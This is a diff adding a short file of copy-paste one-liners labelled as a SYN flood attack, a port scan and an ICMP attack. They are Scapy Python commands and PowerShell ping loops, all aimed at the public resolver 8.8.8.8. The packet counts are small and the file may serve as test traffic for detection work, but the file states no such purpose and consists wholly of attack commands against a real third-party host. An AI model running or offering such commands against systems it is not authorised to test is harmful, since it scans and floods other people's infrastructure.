@@ -1,0 +1,11 @@
+SYN FLOOD ATTACK : python -c "from scapy.all import IP, TCP, send; send(IP(dst='8.8.8.8')/TCP(dport=999, flags='S'), count=40, verbose=False)"
+
+Port Scan att : python -c "from scapy.all import IP, TCP, send; [send(IP(dst='8.8.8.8')/TCP(dport=p, flags='S'), verbose=False) for p in range(100, 126)]"
+
+ICMP ATTACK : 1..50 | ForEach-Object { ping -n 1 -l 10 -w 500 8.8.8.8 > $null }
+
+Icmp: 1..50 | ForEach-Object {
+    $p = New-Object System.Net.NetworkInformation.Ping
+    $p.SendPingAsync("8.8.8.8", 500, [byte[]]::new(10)) | Out-Null
+}
+
